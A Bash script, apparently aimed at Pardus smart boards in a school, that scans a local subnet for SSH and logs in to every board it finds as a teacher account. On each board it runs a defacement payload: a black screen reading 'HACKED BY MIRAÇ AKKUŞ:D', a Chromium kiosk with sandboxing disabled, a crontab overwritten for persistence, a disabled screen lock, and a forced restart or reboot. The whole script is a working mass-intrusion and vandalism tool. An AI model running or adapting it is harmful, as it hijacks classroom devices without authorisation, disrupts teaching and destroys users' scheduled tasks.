#!/bin/bash

# Pardus Tahta SELF-HACK - NO FILES - Pure Text Hack Screen
# MİRAÇ AKKUŞ - %100 DOSYASIZ
TARGET_NET="192.168.1.0/24"
USERNAME="ogretmen"
LOG_FILE="/tmp/tahta_selfhack_$(date +%Y%m%d_%H%M%S).log"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }
log_ok() { echo "[$(date '+%H:%M:%S')] ✅ $1" | tee -a "$LOG_FILE"; }

log "=== SELF-HACK NO-FILE BAŞLADI ==="
log "Target: $TARGET_NET"

# Tools
sudo apt install -y nmap &>>"$LOG_FILE"

# Scan
TARGETS=$(sudo nmap -p 22 --open $TARGET_NET -oG - 2>/dev/null | grep "22/open" | awk '{print $2}')
log_ok "$(echo $TARGETS | wc -w) tahta"

# PURE TEXT HACK SCRIPT (NO FILES NEEDED)
HACK_SCRIPT='
# SIYAH EKRAN + TEXT - DOSYASIZ
export DISPLAY=:0

# Method 1: gsettings + solid color
gsettings set org.gnome.desktop.background primary-color "#000000"
gsettings set org.gnome.desktop.background picture-uri ""
gsettings set org.gnome.desktop.background picture-uri-dark ""

# Method 2: X11 root window text (DIRECT HARDWARE)
xsetroot -solid black
xsetroot -bg black -fg "#00FF00" -title "HACKED BY MIRAÇ AKKUŞ:D"

# Method 3: Console overlay (VT)
echo -e "\\033[40;32m\\033[1mHACKED BY MIRAÇ AKKUŞ:D\\033[0m" | sudo tee /dev/tty1 > /dev/null

# Method 4: Chromium kiosk fullscreen hack
DISPLAY=:0 chromium-browser --kiosk --disable-web-security --no-sandbox \\
    --app="data:text/html,<body style=\\"background:black;color:lime;font-size:80px;font-family:monospace;font-weight:bold;text-align:center;padding-top:300px\\">HACKED BY<br>MIRAÇ AKKUŞ:D<br><br>TÜM TAHTALAR ALINDI!</body>"

# Method 5: Cron persistence
echo "* * * * * export DISPLAY=:0; xsetroot -solid black -fg lime -title \"HACKED BY MIRAÇ AKKUŞ:D\"" | crontab -

# Screensaver OFF
gsettings set org.gnome.desktop.screensaver lock-enabled false

# ULTIMATE RESTART
sudo systemctl restart lightdm || sudo pkill -9 Xorg || sudo reboot
'

# Deploy to ALL
log_ok "Self-hack deploy..."
for HOST in $TARGETS; do
    (
        ssh -l $USERNAME -o StrictHostKeyChecking=no -o ConnectTimeout=3 $HOST "
            $HACK_SCRIPT 2>/dev/null || true
            echo '✅ SELF-HACK $(hostname)'
        " 2>>"$LOG_FILE" &
    )
    printf "."; sleep 0.1
done
wait

cat << EOF

🎉 === SELF-HACK COMPLETED ===
📊 Tahtalar: $(echo $TARGETS | wc -w)
🎨 SIYAH + YEŞİL TEXT (DOSYASIZ!)
📱 Methods: xsetroot + Chromium kiosk + VT + cron
📋 Log: $LOG_FILE

EOF

log_ok "MİRAÇ AKKUŞ SELF-HACK ✅"
